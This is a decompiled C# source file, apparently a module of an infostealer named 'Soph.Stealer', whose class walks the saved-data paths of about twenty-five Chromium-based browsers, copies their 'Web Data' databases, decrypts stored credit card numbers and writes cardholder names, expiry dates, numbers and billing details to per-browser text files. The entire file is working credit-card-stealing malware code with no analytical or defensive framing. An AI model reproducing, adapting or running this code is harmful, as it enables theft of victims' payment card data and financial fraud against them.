using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Soph.Cards;
using Soph.Stealer;

// Token: 0x0200001A RID: 26
internal static class CC
{
    // Token: 0x06000057 RID: 87
    public static void grab_cards(string string_0)
    {
        string environmentVariable = Environment.GetEnvironmentVariable("LocalAppData");
        string[] array = new string[]
        {
            environmentVariable + "\\Google\\Chrome\\User Data\\Default\\Web Data",
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data",
            environmentVariable + "\\Kometa\\User Data\\Default\\Web Data",
            environmentVariable + "\\Orbitum\\User Data\\Default\\Web Data",
            environmentVariable + "\\Comodo\\Dragon\\User Data\\Default\\Web Data",
            environmentVariable + "\\Amigo\\User\\User Data\\Default\\Web Data",
            environmentVariable + "\\Torch\\User Data\\Default\\Web Data",
            environmentVariable + "\\CentBrowser\\User Data\\Default\\Web Data",
            environmentVariable + "\\Go!\\User Data\\Default\\Web Data",
            environmentVariable + "\\uCozMedia\\Uran\\User Data\\Default\\Web Data",
            environmentVariable + "\\MapleStudio\\ChromePlus\\User Data\\Default\\Web Data",
            environmentVariable + "\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data",
            environmentVariable + "\\BlackHawk\\User Data\\Default\\Web Data",
            environmentVariable + "\\AcWebBrowser\\User Data\\Default\\Web Data",
            environmentVariable + "\\CoolNovo\\User Data\\Default\\Web Data",
            environmentVariable + "\\Epic Browser\\User Data\\Default\\Web Data",
            environmentVariable + "\\Baidu Spark\\User Data\\Default\\Web Data",
            environmentVariable + "\\Rockmelt\\User Data\\Default\\Web Data",
            environmentVariable + "\\Sleipnir\\User Data\\Default\\Web Data",
            environmentVariable + "\\SRWare Iron\\User Data\\Default\\Web Data",
            environmentVariable + "\\Titan Browser\\User Data\\Default\\Web Data",
            environmentVariable + "\\Flock\\User Data\\Default\\Web Data",
            environmentVariable + "\\Vivaldi\\User Data\\Default\\Web Data",
            environmentVariable + "\\Sputnik\\User Data\\Default\\Web Data",
            environmentVariable + "\\Maxthon\\User Data\\Default\\Web Data"
        };
        foreach (string text in array)
        {
            try
            {
                string str = "";
                if (text.Contains("Chrome"))
                {
                    str = "Google";
                }
                if (text.Contains("Yandex"))
                {
                    str = "Yandex";
                }
                if (text.Contains("Orbitum"))
                {
                    str = "Orbitum";
                }
                if (text.Contains("Opera"))
                {
                    str = "Opera";
                }
                if (text.Contains("Amigo"))
                {
                    str = "Amigo";
                }
                if (text.Contains("Torch"))
                {
                    str = "Torch";
                }
                if (text.Contains("Comodo"))
                {
                    str = "Comodo";
                }
                if (text.Contains("CentBrowser"))
                {
                    str = "CentBrowser";
                }
                if (text.Contains("Go!"))
                {
                    str = "Go!";
                }
                if (text.Contains("uCozMedia"))
                {
                    str = "uCozMedia";
                }
                if (text.Contains("MapleStudio"))
                {
                    str = "MapleStudio";
                }
                if (text.Contains("BlackHawk"))
                {
                    str = "BlackHawk";
                }
                if (text.Contains("CoolNovo"))
                {
                    str = "CoolNovo";
                }
                if (text.Contains("Vivaldi"))
                {
                    str = "Vivaldi";
                }
                if (text.Contains("Sputnik"))
                {
                    str = "Sputnik";
                }
                if (text.Contains("Maxthon"))
                {
                    str = "Maxthon";
                }
                if (text.Contains("AcWebBrowser"))
                {
                    str = "AcWebBrowser";
                }
                if (text.Contains("Epic Browser"))
                {
                    str = "Epic Browser";
                }
                if (text.Contains("Baidu Spark"))
                {
                    str = "Baidu Spark";
                }
                if (text.Contains("Rockmelt"))
                {
                    str = "Rockmelt";
                }
                if (text.Contains("Sleipnir"))
                {
                    str = "Sleipnir";
                }
                if (text.Contains("SRWare Iron"))
                {
                    str = "SRWare Iron";
                }
                if (text.Contains("Titan Browser"))
                {
                    str = "Titan Browser";
                }
                if (text.Contains("Flock"))
                {
                    str = "Flock";
                }
                try
                {
                    List<CardData> list = CC.fetch_cookies(text);
                    if (list != null)
                    {
                        Directory.CreateDirectory(string_0 + "\\CC\\");
                        using (StreamWriter streamWriter = new StreamWriter(string_0 + "\\CC\\" + str + "_CC.txt"))
                        {
                           
                            foreach (CardData cardData in list)
                            {
                                streamWriter.Write(string.Concat(new string[]
                                {
                                    cardData.Name,
                                    "\t",
                                    cardData.Exp_m,
                                    "\t",
                                    cardData.Exp_y,
                                    "\t",
                                    cardData.Number,
                                    "\t",
                                    cardData.Billing,
                                    "\r\n"
                                }));
                            }
                        }
                    }
                }
                catch
                {
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }

    // Token: 0x06000058 RID: 88
    private static List<CardData> fetch_cookies(string string_0)
    {
        List<CardData> result;
        if (!File.Exists(string_0))
        {
            result = null;
        }
        else
        {
            try
            {
                string text = Path.GetTempPath() + "/" + Helper.GetRandomString() + ".fv";
                if (File.Exists(text))
                {
                    File.Delete(text);
                }
                File.Copy(string_0, text, true);
                Sqlite sqlite = new Sqlite(text);
                sqlite.ReadTable("CC");
                List<CardData> list = new List<CardData>();
                for (int i = 0; i < sqlite.GetRowCount(); i++)
                {
                    try
                    {
                        string number = string.Empty;
                        try
                        {
                            number = Encoding.UTF8.GetString(Chromium.DecryptChromium(Encoding.Default.GetBytes(sqlite.GetValue(i, 12)), null));
                        }
                        catch (Exception)
                        {
                        }
                        bool flag;
                        bool.TryParse(sqlite.GetValue(i, 6), out flag);
                        list.Add(new CardData
                        {
                            Name = sqlite.GetValue(i, 1),
                            Exp_m = sqlite.GetValue(i, 2),
                            Exp_y = sqlite.GetValue(i, 3),
                            Number = number,
                            Billing = sqlite.GetValue(i, 9)
                        });
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
                result = list;
            }
            catch
            {
                result = new List<CardData>();
            }
        }
        return result;
    }
}
